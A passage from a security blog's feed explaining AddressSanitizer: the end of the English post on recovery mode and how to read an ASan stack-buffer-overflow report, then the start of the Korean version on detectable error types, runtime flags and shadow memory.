reporting an error. </p><p>This behavior is also controlled by compile-time options and runtime flags.</p><pre><code class="hljs bash"><span class="hljs-comment"># Activate ASAN Recovery Mode</span>-fsanitize-recover=address<span class="hljs-comment"># Runtime Flag</span>ASAN_OPTIONS=halt_on_error=0</code></pre><p>If we add a <code>getchar()</code> call to the example code used in the redzone section and run it again, we can observe that the program does not terminate even after the error occurs.</p><pre><code class="hljs bash">$ g++ redzone.cpp -o redzone -fsanitize=address -fsanitize-recover=address &amp;&amp; ASAN_OPTIONS=halt_on_error=0 ./redzone===================================================================1481048==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff00408791 at pc 0x5593d35b02fa bp 0x7fff00408750 sp 0x7fff00408740WRITE of size 1 at 0x7fff00408791 thread T0...$ <span class="hljs-built_in">echo</span> $? 0</code></pre><h3 id="3-2-Interpreting-Erros"><a href="#3-2-Interpreting-Erros" class="headerlink" title="3.2 Interpreting Erros"></a>3.2 Interpreting Erros</h3><p>An ASan error report is generally composed of a summary, a call stack, memory information, and the state of the shadow bytes.</p><p>Using the error message produced by running the previous example, let us examine each of these components in detail.</p><pre><code class="hljs bash">$ ./redzone      ===================================================================1670382==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffaec08e11 at pc 0x5591367762fa bp 0x7fffaec08dd0 sp 0x7fffaec08dc0WRITE of size 1 at 0x7fffaec08e11 thread T0    <span class="hljs-comment">#0 0x5591367762f9 in main (/root/asan/redzone+0x12f9)</span>    <span class="hljs-comment">#1 0x7fe1e1807d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>    <span class="hljs-comment">#2 0x7fe1e1807e3f in __libc_start_main_impl ../csu/libc-start.c:392</span>    <span class="hljs-comment">#3 0x559136776144 in _start (/root/asan/redzone+0x1144)</span>Address 0x7fffaec08e11 is located <span class="hljs-keyword">in</span> stack of thread T0 at offset 49 <span class="hljs-keyword">in</span> frame    <span class="hljs-comment">#0 0x559136776218 in main (/root/asan/redzone+0x1218)</span>  This frame has 1 object(s):    [32, 48) <span class="hljs-string">&apos;sp&apos;</span> (line 6) &lt;== Memory access at offset 49 overflows this variableHINT: this may be a <span class="hljs-literal">false</span> positive <span class="hljs-keyword">if</span> your program uses some custom stack unwind mechanism, swapcontext or vfork      (longjmp and C++ exceptions *are* supported)SUMMARY: AddressSanitizer: stack-buffer-overflow (/root/asan/redzone+0x12f9) <span class="hljs-keyword">in</span> mainShadow bytes around the buggy address:  0x100075d79170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791b0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1=&gt;0x100075d791c0: 00 00[f3]f3 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-built_in">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      <span class="hljs-built_in">fc</span>  Array cookie:            ac  Intra object redzone:    bb  ASan internal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==1670382==ABORTING</code></pre><p><strong>Error Overview</strong></p><p>The type of error is a <em>stack-buffer-overflow</em>, and it occurred on thread T0 during a 1-byte write operation.</p><p>Below this, the call stack is displayed, allowing us to trace the function call path that led to the error.</p><ul><li>Faulting location: <code>0x5591367762fa</code></li></ul><pre><code class="hljs bash">==1670382==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffaec08e11 at pc 0x5591367762fa bp 0x7fffaec08dd0 sp 0x7fffaec08dc0WRITE of size 1 at 0x7fffaec08e11 thread T0    <span class="hljs-comment">#0 0x5591367762f9 in main (/root/asan/redzone+0x12f9)</span>    <span class="hljs-comment">#1 0x7fe1e1807d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>    <span class="hljs-comment">#2 0x7fe1e1807e3f in __libc_start_main_impl ../csu/libc-start.c:392</span>    <span class="hljs-comment">#3 0x559136776144 in _start (/root/asan/redzone+0x1144)</span>    Address 0x7fffaec08e11 is located <span class="hljs-keyword">in</span> stack of thread T0 at offset 49 <span class="hljs-keyword">in</span> frame    <span class="hljs-comment">#0 0x559136776218 in main (/root/asan/redzone+0x1218)</span></code></pre><p><strong>Memory Frame Information</strong></p><p>The buffer named <code>sp</code> is valid only within the range <code>[32, 48)</code>&#x2014;that is, 16 bytes&#x2014;within the stack frame, but the reported access occurs at offset 49.</p><p>From this information, we can determine that an out-of-bounds write has occurred.</p><pre><code class="hljs bash">This frame has 1 object(s):  [32, 48) <span class="hljs-string">&apos;sp&apos;</span> (line 6) &lt;== Memory access at offset 49 overflows this variable</code></pre><p><strong>Shadow Bytes State</strong></p><p>The actual accessible range is from <code>0x100075d791c0</code> to <code>0x100075d791c1</code>, but the location marked with <code>=&gt;</code> indicates an access to a poisoned region labeled <code>0xf3</code>, which represents the stack right redzone, as highlighted by the brackets <code>[ ]</code>.</p><p>From this, we can clearly observe the overall memory access permission state.</p><pre><code class="hljs bash">Shadow bytes around the buggy address:  0x100075d79170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791b0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1=&gt;0x100075d791c0: 00 00[f3]f3 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d791f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x100075d79210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</code></pre><p>These components clearly indicate the location, cause, and memory state of the error, making debugging significantly easier.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In this article, we briefly explored Address Sanitizer. While ASan is extremely effective at detecting memory errors, it introduces significant memory and performance overhead due to shadow memory checks, redzones, and frequent runtime instrumentation. For this reason, it is typically used during development, testing, fuzzing, and vulnerability research rather than in production environments.</p><p>Although other sanitizers such as HWASan, UBSan, TSan, and LSan now exist, ASan remains a fundamental and essential tool for memory safety verification.</p><p>In the next article, I plan to explore additional sanitizers in more detail. Thank you for reading! &#x1FAC2;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://learn.microsoft.com/ko-kr/cpp/sanitizers/asan?view=msvc-170">https://learn.microsoft.com/ko-kr/cpp/sanitizers/asan?view=msvc-170</a></li><li><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerUseAfterReturn">https://github.com/google/sanitizers/wiki/AddressSanitizerUseAfterReturn</a></li><li><a href="https://clang.llvm.org/docs/AddressSanitizer.html">https://clang.llvm.org/docs/AddressSanitizer.html</a></li><li><a href="https://github.com/llvm/llvm-project/tree/main">https://github.com/llvm/llvm-project/tree/main</a></li><li><a href="https://github.com/google/sanitizers/issues/100">https://github.com/google/sanitizers/issues/100</a></li><li><a href="https://research.google/pubs/addresssanitizer-a-fast-address-sanity-checker/">https://research.google/pubs/addresssanitizer-a-fast-address-sanity-checker/</a></li><li><a href="https://arxiv.org/pdf/2506.05022v2">https://arxiv.org/pdf/2506.05022v2</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/millet/">millet</category>
      
      <category domain="https://hackyboiz.github.io/tags/Address-Sanitizer/">Address Sanitizer</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/25/millet/asan-pt1-en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Address Sanitizer: Part 1 (KR)</title>
      <link>https://hackyboiz.github.io/2025/12/25/millet/asan-pt1-kr/</link>
      <guid>https://hackyboiz.github.io/2025/12/25/millet/asan-pt1-kr/</guid>
      <pubDate>Thu, 25 Dec 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2025/12/25/millet/a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><img src="/2025/12/25/millet/asan-pt1-kr/image1.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC774;&#xBC88;&#xC5D0; Hackyboiz&#xC5D0; &#xC2E0;&#xC785;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xC628; <code>millet</code>&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;!</p><p>&#xC6CC;&#xAC8C;&#xC784; &#xB3CC;&#xC774;&#xC5C8;&#xB358; &#xC2DC;&#xC808; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xB2E4;&#xAC00; ASan&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xB300;&#xCDA9; &#xBCF4;&#xACE0; &#xB118;&#xACBC;&#xC5C8;&#xC9C0;&#xB9CC;(,,,&#x314E;&#x314E;) &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xD551;&#xACC4; &#xC0BC;&#xC544; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0;&#xC790; &#xC8FC;&#xC81C;&#xB85C; &#xAC00;&#xC838;&#xC624;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC774; ASan&#xC774; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xADF8;&#xB9AC;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-About-Address-Sanitizer"><a href="#1-About-Address-Sanitizer" class="headerlink" title="1. About Address Sanitizer"></a>1. About Address Sanitizer</h2><p>ASan&#xC774;&#xB77C;&#xACE0;&#xB3C4; &#xBD80;&#xB974;&#xB294; Address Sanitizer&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC911; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xB958;&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD0D0;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB7F0;&#xD0C0;&#xC784; &#xC624;&#xB958; &#xAC80;&#xCD9C; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>C/C++&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC791;&#xC131;&#xD560; &#xB54C; &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB828; &#xBC84;&#xADF8;&#xB97C; &#xC7A1;&#xC544;&#xC8FC;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xB294; &#xB3C4;&#xAD6C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB3FC;&#xC694;. &#xCD08;&#xAE30;&#xC5D0;&#xB294; &#xAD6C;&#xAE00;&#xC5D0;&#xC11C; <a href="https://github.com/google/sanitizers">&#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;</a> &#xD604;&#xC7AC;&#xB294; LLVM &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC758; &#xC77C;&#xBD80;&#xB85C;&#xC11C; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ASan&#xC740; &#xC5EC;&#xB7EC; &#xAD6C;&#xD604;&#xCCB4;&#xB85C; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;! &#xC800;&#xB294; &#xB9AC;&#xB205;&#xC2A4;&#xB97C; &#xC88B;&#xC544;&#xD558;&#xB2C8; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; GCC&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; Sanitizer&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xB9AC;&#xB205;&#xC2A4; &#xBC30;&#xD3EC;&#xD310;&#xC5D0;&#xC11C;&#xB294; gcc&#xB97C; &#xC124;&#xCE58;&#xD560; &#xB54C; &#xAD00;&#xB828; &#xB7F0;&#xD0C0;&#xC784; &#xD328;&#xD0A4;&#xC9C0;&#xB3C4; &#xAC19;&#xC774; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;. (gcc&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; libasan &#xD328;&#xD0A4;&#xC9C0;&#xAC00; &#xAC19;&#xC774; &#xC124;&#xCE58;&#xB418;&#xB294; &#xD615;&#xC2DD;&#xC774;&#xC5D0;&#xC694;.)</p><pre><code class="hljs bash">$ (dpkg -l | grep libasan) &amp;&amp; (gcc --version | head -1)ii  libasan6:amd64                       11.4.0-1ubuntu1~22.04.2                    amd64        AddressSanitizer -- a fast memory error detectorgcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0</code></pre><p>GCC&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xB418;&#xB294; ASan&#xB3C4; LLVM ASAN&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xBAA8;&#xB378;&#xACFC; &#xAC80;&#xC0AC; &#xAE30;&#xBC95;&#xC744; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC1C;&#xB150;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xCC28;&#xC774;&#xAC00; &#xC5C6;&#xB2F5;&#xB2C8;&#xB2E4;. &#xD750;&#xD750;,,,</p><p><img src="/2025/12/25/millet/asan-pt1-kr/image2.png" alt></p><p>ASan&#xC740; &#xD604;&#xC7AC; &#xB2E4;&#xC74C;&#xC758; &#xD658;&#xACBD;&#xB4E4;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>OS</th><th>x86</th><th>x86_64</th><th>ARM</th><th>ARM64</th><th>MIPS</th><th>MIPS64</th><th>PowerPC</th><th>PowerPC64</th></tr></thead><tbody><tr><td>Linux</td><td>O</td><td>O</td><td></td><td></td><td>O</td><td>O</td><td>O</td><td>O</td></tr><tr><td>OS X</td><td>O</td><td>O</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>iOS Simulator</td><td>O</td><td>O</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>FreeBSD</td><td>O</td><td>O</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Android</td><td>O</td><td>O</td><td>O</td><td>O</td><td></td><td></td><td></td></tr></tbody></table></div><h3 id="1-1-&#xD0D0;&#xC9C0;-&#xAC00;&#xB2A5;&#xD55C;-&#xBA54;&#xBAA8;&#xB9AC;-&#xC624;&#xB958;"><a href="#1-1-&#xD0D0;&#xC9C0;-&#xAC00;&#xB2A5;&#xD55C;-&#xBA54;&#xBAA8;&#xB9AC;-&#xC624;&#xB958;" class="headerlink" title="1.1 &#xD0D0;&#xC9C0; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xB958;"></a>1.1 &#xD0D0;&#xC9C0; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xB958;</h3><p>ASan&#xC740; &#xC774;&#xB984;&#xB2F5;&#xAC8C; &#xC6EC;&#xB9CC;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xB958;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xD0D0;&#xC9C0;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD06C;&#xAC8C; &#xCEF4;&#xD30C;&#xC77C; &#xC635;&#xC158;&#xACFC; &#xB7F0;&#xD0C0;&#xC784; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xD1B5;&#xD574; &#xD0D0;&#xC9C0; &#xBC94;&#xC704;&#xC640; &#xC815;&#xCC45;&#xC744; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC778; &#xAC83;&#xB4E4;&#xC744; &#xD55C; &#xBC88; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;?</p><p><strong>Use After Free (Dangling Pointer Dereference)<br>Heap Buffer Overflow<br>Stack Buffer Overflow<br>Global Buffer Overflow</strong></p><pre><code class="hljs bash">-fsanitize=address</code></pre><p><strong>Use After Return</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=detect_stack_use_after_return=1</code></pre><ul><li>&#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC744; &#xBCC4;&#xB3C4;&#xC758; &#xAC00;&#xC0C1; &#xD799;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC131;&#xB2A5; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xD07C;</li></ul><p><strong>Use After Scope</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=detect_stack_use_after_scope=1</code></pre><p><strong>Initialization Order Bugs</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=check_initialization_order=1</code></pre><ul><li>&#xC804;&#xC5ED; &#xAC1D;&#xCCB4; &#xAC1C;&#xB150;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; C++ &#xC804;&#xC6A9;</li></ul><p><strong>Memory Leaks</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=detect_leaks=1</code></pre><ul><li>ASan&#xC774; &#xC544;&#xB2CC; <a href="https://clang.llvm.org/docs/LeakSanitizer.html">LeakSanitizer</a>&#xC758; &#xCC45;&#xC784;</li></ul><p>&#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xB7F0;&#xD0C0;&#xC784; &#xD50C;&#xB798;&#xADF8;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xB354; &#xB9CE;&#xC740; &#xC815;&#xCC45;&#xB4E4;&#xC744; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8; &#xAE30;&#xB2A5;&#xC778; <code>-fsanitize=address</code>&#xB97C; &#xC801;&#xC6A9;&#xD588;&#xC744; &#xACBD;&#xC6B0;&#xC5D0; &#xB300;&#xD574; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB610;&#xD55C; ASan&#xC758; &#xACBD;&#xC6B0; fast unwinder&#xAC00; &#xD504;&#xB808;&#xC784; &#xD3EC;&#xC778;&#xD130; &#xCCB4;&#xC778;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC74C;&#xC758; &#xC635;&#xC158;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xC5EC; RBP &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD504;&#xB808;&#xC784; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAD8C;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">-fno-omit-frame-pointer</code></pre><h2 id="2-ASan-&#xAC10;&#xC2DC;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;"><a href="#2-ASan-&#xAC10;&#xC2DC;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;" class="headerlink" title="2. ASan &#xAC10;&#xC2DC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;"></a>2. ASan &#xAC10;&#xC2DC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB4EF;&#xC774; <code>-fsanitize=address</code>&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD0D0;&#xC9C0;&#xB4E4;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xB958;&#xB4E4;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xB294; &#xAC78;&#xAE4C;&#xC694;?</p><p>ASan&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD06C;&#xAC8C; 3&#xAC1C;&#xC758; &#xAC10;&#xC2DC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>Shadow Memory &#xAE30;&#xBC18; &#xC811;&#xADFC; &#xAC10;&#xC2DC;</strong></p><p><strong>Poisoning / Unpoisoning&#xC744; &#xD1B5;&#xD55C; &#xC0DD;&#xBA85;&#xC8FC;&#xAE30; &#xCD94;&#xC801;</strong></p><p><strong>Redzone&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xACBD;&#xACC4; &#xAC10;&#xC9C0;</strong></p><p>&#xCEF4;&#xD30C;&#xC77C; &#xD0C0;&#xC784; &#xACC4;&#xCE21;(Compile Time Instrumentation)&#xC744; &#xC704;&#xD574; &#xC704;&#xC758; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xB4E4;&#xC774; &#xCEF4;&#xD30C;&#xC77C; &#xD0C0;&#xC784;&#xC5D0; &#xCF54;&#xB4DC;&#xC5D0; &#xC0BD;&#xC785;&#xB429;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xACE0; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC811;&#xADFC;&#xC5D0; &#xB300;&#xD574; &#xC0BD;&#xC785;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xCC45;&#xC5D0; &#xC704;&#xBC18;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xC624;&#xB958; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCD9C;&#xB825;&#xB418;&#xACE0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC989;&#xC2DC; &#xC911;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD55C; &#xC870;&#xAC74;&#xBB38;&#xACFC; &#xC624;&#xB958; &#xBCF4;&#xACE0; &#xCF54;&#xB4DC;&#xB294; &#xD06C;&#xAC8C; &#xB2E4;&#xC74C;&#xC758; &#xC9C0;&#xC810;&#xC5D0; &#xC0BD;&#xC785;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xBA85;&#xB839; &#xC774;&#xC804;</li><li>&#xB3D9;&#xC801; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xC2DC;&#xC810;</li><li>&#xB3D9;&#xC801; &#xBA54;&#xBAA8;&#xB9AC; &#xD574;&#xC81C; &#xC2DC;&#xC810;</li><li>&#xD568;&#xC218; &#xC9C4;&#xC785; &#xC2DC; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; &#xAD6C;&#xC131; &#xC9C0;&#xC810;</li><li>&#xD568;&#xC218; &#xBC18;&#xD658; &#xC2DC; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; &#xD574;&#xC81C; &#xC9C0;&#xC810;</li><li>&#xC804;&#xC5ED; &#xAC1D;&#xCCB4; &#xCD08;&#xAE30;&#xD654; &#xBC0F; &#xC885;&#xB8CC; &#xC9C0;&#xC810;</li></ul><pre><code class="hljs c">byte *shadow_address = MemToShadow(address);byte shadow_value = *shadow_address;<span class="hljs-keyword">if</span> (shadow_value) {<span class="hljs-keyword">if</span> (SlowPathCheck(shadow_value, address, kAccessSize)) {ReportError(address, kAccessSize, kIsWrite);}}</code></pre><p>&#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;?</p><h3 id="2-1-Shadow-Memory"><a href="#2-1-Shadow-Memory" class="headerlink" title="2.1 Shadow Memory"></a>2.1 Shadow Memory</h3><p>ASan&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD574; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC;&#xB77C;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xC601;&#xC5ED;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xAC01; &#xBC14;&#xC774;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xBA54;&#xBAA8;&#xB9AC; &#xBC14;&#xC774;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB420; &#xC8FC;&#xC18C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + SHADOW_OFFSET</code></pre><p>&#xC774;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xC758; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xD1B5;&#xD574; &#xAD6C;&#xD604;&#xB418;&#xC5B4; 